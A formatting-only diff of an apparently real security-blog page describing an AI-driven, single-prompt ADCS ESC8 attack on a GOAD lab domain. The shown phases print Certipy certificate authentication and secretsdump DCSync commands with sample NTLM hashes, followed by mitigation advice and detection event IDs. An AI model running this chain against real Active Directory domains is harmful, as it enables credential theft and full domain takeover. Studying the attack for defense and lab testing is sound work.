-<li class=""><code>execute_python_script</code>- Certipy authentication</li>
+<li class=""><code>execute_python_script</code> - Certipy authentication</li>
 </ul>
 <p><strong>Attack Command:</strong></p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">certipy auth -pfx administrator.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">pfx</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> -dc-ip </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">192.168</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.56</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.10</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">certipy auth -pfx administrator.pfx -dc-ip 192.168.56.10</span><br></div></code></pre></div></div>
 <p><strong>Results:</strong></p>
 <ul>
 <li class="">
-<p><strong>Kerberos TGT:</strong><code>administrator.ccache</code>(obtained)</p>
+<p><strong>Kerberos TGT:</strong> <code>administrator.ccache</code> (obtained)</p>
 </li>
 <li class="">
-<p><strong>NTLM Hash:</strong><code>c66d72021a2d4744409969a581a1705e</code>(extracted)</p>
+<p><strong>NTLM Hash:</strong> <code>c66d72021a2d4744409969a581a1705e</code> (extracted)</p>
 </li>
 <li class="">
-<p><strong>Status:</strong>✓ Authentication successful</p>
+<p><strong>Status:</strong> ✓ Authentication successful</p>
 </li>
 </ul>
 <p><strong>Automation Features:</strong></p>
@@ -292,27 +292,27 @@
 </li>
 </ul>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="phase-6-domain-compromise-dcsync">Phase 6: Domain Compromise (DCSync)<a href="#phase-6-domain-compromise-dcsync" class="hash-link" aria-label="Direct link to Phase 6: Domain Compromise (DCSync)" title="Direct link to Phase 6: Domain Compromise (DCSync)" translate="no">​</a></h3>
-<p>**Objective:**Extract all domain credentials.</p>
+<p><strong>Objective:</strong> Extract all domain credentials.</p>
 <p><strong>Tools Used:</strong></p>
 <ul>
-<li class=""><code>execute_python_script</code>- Impacket secretsdump</li>
+<li class=""><code>execute_python_script</code> - Impacket secretsdump</li>
 </ul>
 <p><strong>Attack Command:</strong></p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">export KRB5CCNAME=administrator.ccache</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">secretsdump.py -k -</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">no</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">-pass Administrator@sevenkingdoms.local@192.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">168.56</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">10</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">export KRB5CCNAME=administrator.ccache</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">secretsdump.py -k -no-pass Administrator@sevenkingdoms.local@192.168.56.10</span><br></div></code></pre></div></div>
 <p><strong>Results:</strong></p>
 <ul>
 <li class="">
-<p>**Total Hashes Extracted:**27 user accounts</p>
+<p><strong>Total Hashes Extracted:</strong> 27 user accounts</p>
 </li>
 <li class="">
-<p>**krbtgt Hash:**Extracted (enables Golden Ticket attacks)</p>
+<p><strong>krbtgt Hash:</strong> Extracted (enables Golden Ticket attacks)</p>
 </li>
 <li class="">
-<p><strong>Domain Compromise:</strong>✓ Complete</p>
+<p><strong>Domain Compromise:</strong> ✓ Complete</p>
 </li>
 </ul>
 <p><strong>Sample Hashes:</strong></p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">Administrator</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">500</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">:aad3b435b51404eeaad3b435b51404ee</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">:c66d72021a2d4744409969a581a1705e</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">krbtgt:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">502</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">:aad3b435b51404eeaad3b435b51404ee</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">8dCT-</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">DJjgScp</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">...</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">TestUser</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">1001</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">:aad3b435b51404eeaad3b435b51404ee</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">...</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">:</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">Administrator:500:aad3b435b51404eeaad3b435b51404ee:c66d72021a2d4744409969a581a1705e:::</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8dCT-DJjgScp...:::</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">TestUser:1001:aad3b435b51404eeaad3b435b51404ee:...:::</span><br></div></code></pre></div></div>
 <p><strong>Automation Features:</strong></p>
 <ul>
 <li class="">
@@ -329,10 +329,10 @@
 </li>
 </ul>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="phase-7-reporting">Phase 7: Reporting<a href="#phase-7-reporting" class="hash-link" aria-label="Direct link to Phase 7: Reporting" title="Direct link to Phase 7: Reporting" translate="no">​</a></h3>
-<p>**Objective:**Generate comprehensive report with all artifacts.</p>
+<p><strong>Objective:</strong> Generate comprehensive report with all artifacts.</p>
 <p><strong>Tools Used:</strong></p>
 <ul>
-<li class=""><code>create_file</code>- Report generation</li>
+<li class=""><code>create_file</code> - Report generation</li>
 </ul>
 <p><strong>Report Contents:</strong></p>
 <ul>
@@ -361,22 +361,22 @@
 <p><strong>Artifacts Generated:</strong></p>
 <ul>
 <li class="">
-<p><code>administrator.pfx</code>- Certificate file</p>
+<p><code>administrator.pfx</code> - Certificate file</p>
 </li>
 <li class="">
-<p><code>administrator.ccache</code>- Kerberos credential cache</p>
+<p><code>administrator.ccache</code> - Kerberos credential cache</p>
 </li>
 <li class="">
-<p><code>administrator.hash</code>- NTLM hash</p>
+<p><code>administrator.hash</code> - NTLM hash</p>
 </li>
 <li class="">
-<p><code>secretsdump.txt</code>- All domain hashes</p>
+<p><code>secretsdump.txt</code> - All domain hashes</p>
 </li>
 <li class="">
-<p><code>attack_report.md</code>- Comprehensive report</p>
+<p><code>attack_report.md</code> - Comprehensive report</p>
 </li>
 <li class="">
-<p><code>attack.log</code>- Complete execution log</p>
+<p><code>attack.log</code> - Complete execution log</p>
 </li>
 </ul>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="automation-features">Automation Features<a href="#automation-features" class="hash-link" aria-label="Direct link to Automation Features" title="Direct link to Automation Features" translate="no">​</a></h2>
@@ -384,35 +384,35 @@
 <p>The framework handles common errors automatically:</p>
 <ul>
 <li class="">
-<p>**Port Scan Fails:**Tries alternative scan methods</p>
+<p><strong>Port Scan Fails:</strong> Tries alternative scan methods</p>
 </li>
 <li class="">
-<p>**SMB Enumeration Fails:**Attempts with different credentials</p>
+<p><strong>SMB Enumeration Fails:</strong> Attempts with different credentials</p>
 </li>
 <li class="">
-<p>**Certificate Request Fails:**Tries alternative templates</p>
+<p><strong>Certificate Request Fails:</strong> Tries alternative templates</p>
 </li>
 <li class="">
-<p>**Authentication Fails:**Retries with different methods</p>
+<p><strong>Authentication Fails:</strong> Retries with different methods</p>
 </li>
 <li class="">
-<p>**DCSync Fails:**Verifies Kerberos and retries</p>
+<p><strong>DCSync Fails:</strong> Verifies Kerberos and retries</p>
 </li>
 </ul>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="2-intelligent-decision-making">2. Intelligent Decision Making<a href="#2-intelligent-decision-making" class="hash-link" aria-label="Direct link to 2. Intelligent Decision Making" title="Direct link to 2. Intelligent Decision Making" translate="no">​</a></h3>
 <p>The AI makes decisions based on results:</p>
 <ul>
 <li class="">
-<p>**Domain Discovery:**Automatically extracts domain from enumeration</p>
+<p><strong>Domain Discovery:</strong> Automatically extracts domain from enumeration</p>
 </li>
 <li class="">
-<p>**Template Selection:**Chooses vulnerable templates automatically</p>
+<p><strong>Template Selection:</strong> Chooses vulnerable templates automatically</p>
 </li>
 <li class="">
-<p>**Credential Validation:**Tests credentials before using them</p>
+<p><strong>Credential Validation:</strong> Tests credentials before using them</p>
 </li>
 <li class="">
-<p>**Error Recovery:**Adapts strategy based on failures</p>
+<p><strong>Error Recovery:</strong> Adapts strategy based on failures</p>
 </li>
 </ul>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="3-comprehensive-logging">3. Comprehensive Logging<a href="#3-comprehensive-logging" class="hash-link" aria-label="Direct link to 3. Comprehensive Logging" title="Direct link to 3. Comprehensive Logging" translate="no">​</a></h3>
@@ -436,93 +436,93 @@
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="key-achievements">Key Achievements<a href="#key-achievements" class="hash-link" aria-label="Direct link to Key Achievements" title="Direct link to Key Achievements" translate="no">​</a></h2>
 <ul>
 <li class="">
-<p>✅**Zero Knowledge Start:**Began with only IP address</p>
+<p>✅ <strong>Zero Knowledge Start:</strong> Began with only IP address</p>
 </li>
 <li class="">
-<p>✅**Full Domain Compromise:**Extracted all 27 user hashes</p>
+<p>✅ <strong>Full Domain Compromise:</strong> Extracted all 27 user hashes</p>
 </li>
 <li class="">
-<p>✅**krbtgt Hash:**Obtained (enables Golden Ticket)</p>
+<p>✅ <strong>krbtgt Hash:</strong> Obtained (enables Golden Ticket)</p>
 </li>
 <li class="">
-<p>✅**Complete Automation:**Single prompt execution</p>
+<p>✅ <strong>Complete Automation:</strong> Single prompt execution</p>
 </li>
 <li class="">
-<p>✅**Comprehensive Reporting:**Full documentation generated</p>
+<p>✅ <strong>Comprehensive Reporting:</strong> Full documentation generated</p>
 </li>
 </ul>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="technical-deep-dive">Technical Deep Dive<a href="#technical-deep-dive" class="hash-link" aria-label="Direct link to Technical Deep Dive" title="Direct link to Technical Deep Dive" translate="no">​</a></h2>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="why-this-attack-is-complicated">Why This Attack is Complicated<a href="#why-this-attack-is-complicated" class="hash-link" aria-label="Direct link to Why This Attack is Complicated" title="Direct link to Why This Attack is Complicated" translate="no">​</a></h3>
 <ul>
 <li class="">
-<p>**Multi-Tool Orchestration:**Coordinates 10+ different security tools</p>
+<p><strong>Multi-Tool Orchestration:</strong> Coordinates 10+ different security tools</p>
 </li>
 <li class="">
-<p>**Dependency Management:**Each phase depends on previous results</p>
+<p><strong>Dependency Management:</strong> Each phase depends on previous results</p>
 </li>
 <li class="">
-<p>**Error Handling:**Automatically recovers from failures</p>
+<p><strong>Error Handling:</strong> Automatically recovers from failures</p>
 </li>
 <li class="">
-<p>**Data Parsing:**Extracts structured data from unstructured outputs</p>
+<p><strong>Data Parsing:</strong> Extracts structured data from unstructured outputs</p>
 </li>
 <li class="">
-<p>**Decision Logic:**Makes intelligent choices based on context</p>
+<p><strong>Decision Logic:</strong> Makes intelligent choices based on context</p>
 </li>
 </ul>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="attack-complexity-metrics">Attack Complexity Metrics<a href="#attack-complexity-metrics" class="hash-link" aria-label="Direct link to Attack Complexity Metrics" title="Direct link to Attack Complexity Metrics" translate="no">​</a></h2>
 <ul>
 <li class="">
-<p>**Tools Used:**15+</p>
+<p><strong>Tools Used:</strong> 15+</p>
 </li>
 <li class="">
-<p>**Phases:**7</p>
+<p><strong>Phases:</strong> 7</p>
 </li>
 <li class="">
-<p>**Decision Points:**20+</p>
+<p><strong>Decision Points:</strong> 20+</p>
 </li>
 <li class="">
-<p>**Error Scenarios Handled:**10+</p>
+<p><strong>Error Scenarios Handled:</strong> 10+</p>
 </li>
 <li class="">
-<p>**Artifacts Generated:**10+</p>
+<p><strong>Artifacts Generated:</strong> 10+</p>
 </li>
 </ul>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="defense-and-mitigation">Defense and Mitigation<a href="#defense-and-mitigation" class="hash-link" aria-label="Direct link to Defense and Mitigation" title="Direct link to Defense and Mitigation" translate="no">​</a></h2>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="immediate-actions">Immediate Actions<a href="#immediate-actions" class="hash-link" aria-label="Direct link to Immediate Actions" title="Direct link to Immediate Actions" translate="no">​</a></h3>
 <ul>
 <li class="">
-<p>**Disable HTTP Web Enrollment:**Force HTTPS only</p>
+<p><strong>Disable HTTP Web Enrollment:</strong> Force HTTPS only</p>
 </li>
 <li class="">
-<p>**Enable SMB Signing:**Prevent NTLM relay</p>
+<p><strong>Enable SMB Signing:</strong> Prevent NTLM relay</p>
 </li>
 <li class="">
-<p>**Restrict Certificate Templates:**Remove vulnerable templates</p>
+<p><strong>Restrict Certificate Templates:</strong> Remove vulnerable templates</p>
 </li>
 <li class="">
-<p>**Monitor Certificate Requests:**Alert on suspicious requests</p>
+<p><strong>Monitor Certificate Requests:</strong> Alert on suspicious requests</p>
 </li>
 <li class="">
-<p>**Implement Certificate Pinning:**Prevent certificate abuse</p>
+<p><strong>Implement Certificate Pinning:</strong> Prevent certificate abuse</p>
 </li>
 </ul>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="long-term-security">Long-Term Security<a href="#long-term-security" class="hash-link" aria-label="Direct link to Long-Term Security" title="Direct link to Long-Term Security" translate="no">​</a></h2>
 <ul>
 <li class="">
-<p>**Regular ADCS Audits:**Review template permissions</p>
+<p><strong>Regular ADCS Audits:</strong> Review template permissions</p>
 </li>
 <li class="">
-<p>**Network Segmentation:**Isolate ADCS servers</p>
+<p><strong>Network Segmentation:</strong> Isolate ADCS servers</p>
 </li>
 <li class="">
-<p>**Privileged Access Management:**Limit certificate enrollment</p>
+<p><strong>Privileged Access Management:</strong> Limit certificate enrollment</p>
 </li>
 <li class="">
-<p>**Security Monitoring:**Detect ESC8 attack patterns</p>
+<p><strong>Security Monitoring:</strong> Detect ESC8 attack patterns</p>
 </li>
 <li class="">
-<p>**Staff Training:**Educate on ADCS security</p>
+<p><strong>Staff Training:</strong> Educate on ADCS security</p>
 </li>
 </ul>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="detection-and-monitoring">Detection and Monitoring<a href="#detection-and-monitoring" class="hash-link" aria-label="Direct link to Detection and Monitoring" title="Direct link to Detection and Monitoring" translate="no">​</a></h2>
@@ -567,7 +567,7 @@
 </ul>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="detection-queries">Detection Queries<a href="#detection-queries" class="hash-link" aria-label="Direct link to Detection Queries" title="Direct link to Detection Queries" translate="no">​</a></h2>
 <p><strong>Windows Event Log:</strong></p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">Event</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> ID </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">4886</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> - Certificate Request</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Event</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> ID </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">4887</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> - Certificate Request Disposition</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Event</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> ID </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">4624</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> - Successful Logon (PKINIT)</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Event</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> ID </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">4662</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> - DCSync Operation</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">Event ID 4886 - Certificate Request</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Event ID 4887 - Certificate Request Disposition</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Event ID 4624 - Successful Logon (PKINIT)</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Event ID 4662 - DCSync Operation</span><br></div></code></pre></div></div>
 <p><strong>SIEM Queries:</strong></p>
 <ul>
 <li class="">
@@ -584,43 +584,43 @@
 <p>This fully automated ADCS ESC8 attack demonstrates:</p>
 <ul>
 <li class="">
-<p>**The Power of AI-Driven Pentesting:**Single prompt achieves complete attack chain</p>
+<p><strong>The Power of AI-Driven Pentesting:</strong> Single prompt achieves complete attack chain</p>
 </li>
 <li class="">
-<p>**The Severity of ESC8:**One misconfiguration leads to full domain compromise</p>
+<p><strong>The Severity of ESC8:</strong> One misconfiguration leads to full domain compromise</p>
 </li>
 <li class="">
-<p>**The Need for Automation:**Manual testing cannot match AI speed and consistency</p>
+<p><strong>The Need for Automation:</strong> Manual testing cannot match AI speed and consistency</p>
 </li>
 <li class="">
-<p>**The Importance of Defense:**Proper ADCS configuration is critical</p>
+<p><strong>The Importance of Defense:</strong> Proper ADCS configuration is critical</p>
 </li>
 </ul>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="key-takeaways">Key Takeaways<a href="#key-takeaways" class="hash-link" aria-label="Direct link to Key Takeaways" title="Direct link to Key Takeaways" translate="no">​</a></h2>
 <ul>
 <li class="">
-<p>✅**ESC8 is Critical:**HTTP Web Enrollment is a severe vulnerability</p>
+<p>✅ <strong>ESC8 is Critical:</strong> HTTP Web Enrollment is a severe vulnerability</p>
 </li>
 <li class="">
-<p>✅**Automation Works:**AI can execute complex attack chains automatically</p>
+<p>✅ <strong>Automation Works:</strong> AI can execute complex attack chains automatically</p>
 </li>
 <li class="">
-<p>✅**Defense is Possible:**Proper configuration prevents this attack</p>
+<p>✅ <strong>Defense is Possible:</strong> Proper configuration prevents this attack</p>
 </li>
 <li class="">
-<p>✅**Monitoring is Essential:**Detect and respond to certificate-based attacks</p>
+<p>✅ <strong>Monitoring is Essential:</strong> Detect and respond to certificate-based attacks</p>
 </li>
 </ul>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="references">References<a href="#references" class="hash-link" aria-label="Direct link to References" title="Direct link to References" translate="no">​</a></h2>
 <ul>
 <li class="">
-<p><a href="https://specterops.io/assets/resources/Certified_Pre-Owned.pdf" target="_blank" rel="noopener noreferrer" class="">Certified Pre-Owned Research</a>— SpecterOps</p>
+<p><a href="https://specterops.io/assets/resources/Certified_Pre-Owned.pdf" target="_blank" rel="noopener noreferrer" class="">Certified Pre-Owned Research</a> — SpecterOps</p>
 </li>
 <li class="">
-<p><a href="https://github.com/ly4k/Certipy" target="_blank" rel="noopener noreferrer" class="">ADCS ESC8 Vulnerability</a>— Certipy Documentation</p>
+<p><a href="https://github.com/ly4k/Certipy" target="_blank" rel="noopener noreferrer" class="">ADCS ESC8 Vulnerability</a> — Certipy Documentation</p>
 </li>
 <li class="">
-<p><a href="https://github.com/Orange-Cyberdefense/GOAD" target="_blank" rel="noopener noreferrer" class="">GOAD Lab Environment</a>— Game of Active Directory</p>
+<p><a href="https://github.com/Orange-Cyberdefense/GOAD" target="_blank" rel="noopener noreferrer" class="">GOAD Lab Environment</a> — Game of Active Directory</p>
 </li>
 </ul></div></article><nav class="docusaurus-mt-lg pagination-nav" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/medium-blog-navigation/docs/articles/2026/2026-01-29-building-a-vulnerable-gcp-pentest-lab-with-terraform-9d1edfcd8eff"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Building a Vulnerable GCP Pentest Lab with Terraform</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/medium-blog-navigation/docs/articles/2026/2026-01-31-a-complete-cloud-penetration-testing-walkthrough-1914f687d7fd"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">A Complete Cloud Penetration Testing Walkthrough</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#ecosystem-fit" class="table-of-contents__link toc-highlight">Ecosystem Fit</a><ul><li><a href="#one-prompt-domain-compromise" class="table-of-contents__link toc-highlight">One-Prompt Domain Compromise</a></li></ul></li><li><a href="#abstract" class="table-of-contents__link toc-highlight">Abstract</a></li><li><a href="#introduction" class="table-of-contents__link toc-highlight">Introduction</a></li><li><a href="#what-makes-this-attack-complicated" class="table-of-contents__link toc-highlight">What Makes This Attack Complicated?</a></li><li><a href="#attack-overview" class="table-of-contents__link toc-highlight">Attack Overview</a><ul><li><a href="#target-environment" class="table-of-contents__link toc-highlight">Target Environment</a></li></ul></li><li><a href="#attack-chain" class="table-of-contents__link toc-highlight">Attack Chain</a></li><li><a href="#the-one-prompt-approach" class="table-of-contents__link toc-highlight">The One-Prompt Approach</a><ul><li><a href="#the-prompt" class="table-of-contents__link toc-highlight">The Prompt</a></li></ul></li><li><a href="#why-this-works" class="table-of-contents__link toc-highlight">Why This Works</a></li><li><a href="#phase-by-phase-execution" class="table-of-contents__link toc-highlight">Phase-by-Phase Execution</a><ul><li><a href="#phase-1-reconnaissance" class="table-of-contents__link toc-highlight">Phase 1: Reconnaissance</a></li><li><a href="#phase-2-credential-acquisition" class="table-of-contents__link toc-highlight">Phase 2: Credential Acquisition</a></li><li><a href="#phase-3-adcs-enumeration" class="table-of-contents__link toc-highlight">Phase 3: ADCS Enumeration</a></li><li><a href="#phase-4-certificate-request" class="table-of-contents__link toc-highlight">Phase 4: Certificate Request</a></li><li><a href="#phase-5-certificate-authentication" class="table-of-contents__link toc-highlight">Phase 5: Certificate Authentication</a></li><li><a href="#phase-6-domain-compromise-dcsync" class="table-of-contents__link toc-highlight">Phase 6: Domain Compromise (DCSync)</a></li><li><a href="#phase-7-reporting" class="table-of-contents__link toc-highlight">Phase 7: Reporting</a></li></ul></li><li><a href="#automation-features" class="table-of-contents__link toc-highlight">Automation Features</a><ul><li><a href="#1-automatic-troubleshooting" class="table-of-contents__link toc-highlight">1. Automatic Troubleshooting</a></li><li><a href="#2-intelligent-decision-making" class="table-of-contents__link toc-highlight">2. Intelligent Decision Making</a></li><li><a href="#3-comprehensive-logging" class="table-of-contents__link toc-highlight">3. Comprehensive Logging</a></li></ul></li><li><a href="#results-summary" class="table-of-contents__link toc-highlight">Results Summary</a><ul><li><a href="#attack-timeline" class="table-of-contents__link toc-highlight">Attack Timeline</a></li></ul></li><li><a href="#key-achievements" class="table-of-contents__link toc-highlight">Key Achievements</a></li><li><a href="#technical-deep-dive" class="table-of-contents__link toc-highlight">Technical Deep Dive</a><ul><li><a href="#why-this-attack-is-complicated" class="table-of-contents__link toc-highlight">Why This Attack is Complicated</a></li></ul></li><li><a href="#attack-complexity-metrics" class="table-of-contents__link toc-highlight">Attack Complexity Metrics</a></li><li><a href="#defense-and-mitigation" class="table-of-contents__link toc-highlight">Defense and Mitigation</a><ul><li><a href="#immediate-actions" class="table-of-contents__link toc-highlight">Immediate Actions</a></li></ul></li><li><a href="#long-term-security" class="table-of-contents__link toc-highlight">Long-Term Security</a></li><li><a href="#detection-and-monitoring" class="table-of-contents__link toc-highlight">Detection and Monitoring</a><ul><li><a href="#indicators-of-compromise-iocs" class="table-of-contents__link toc-highlight">Indicators of Compromise (IOCs)</a></li></ul></li><li><a href="#detection-queries" class="table-of-contents__link toc-highlight">Detection Queries</a></li><li><a href="#conclusion" class="table-of-contents__link toc-highlight">Conclusion</a></li><li><a href="#key-takeaways" class="table-of-contents__link toc-highlight">Key Takeaways</a></li><li><a href="#references" class="table-of-contents__link toc-highlight">References</a></li></ul></div></div></div></div></main></div></div></div><footer class="site-footer" data-site-shell="standalone" data-site-shell-version="2026-07-24.1"><div class="shared-footer-inner"><a class="shared-footer-brand" href="/"><img src="/assets/ap-logo.png" alt="" width="32" height="32" loading="lazy" decoding="async"><span><strong>Andrey Pautov</strong><small>Security research</small></span></a><nav class="shared-footer-links" aria-label="Footer navigation"><a href="/cti.html">Research</a><a href="/guides.html">Library</a><a href="/projects.html">Products &amp; Labs</a><a href="/adversarygraph/">AdversaryGraph</a><a href="/about.html">About</a></nav><nav class="shared-footer-meta" aria-label="Site information"><a href="/privacy.html">Privacy / Data Handling</a><a href="/about.html#contact">Contact</a><a href="https://github.com/anpa1200" target="_blank" rel="noopener noreferrer">GitHub<span class="visually-hidden"> (opens in a new tab)</span><span aria-hidden="true"> ↗</span></a></nav></div><div class="shared-footer-bottom"><span>© <!-- -->2026<!-- --> Andrey Pautov · Original research and tooling</span><a href="#top" data-back-to-top="true">Back to top ↑</a></div></footer></div>
 </body>
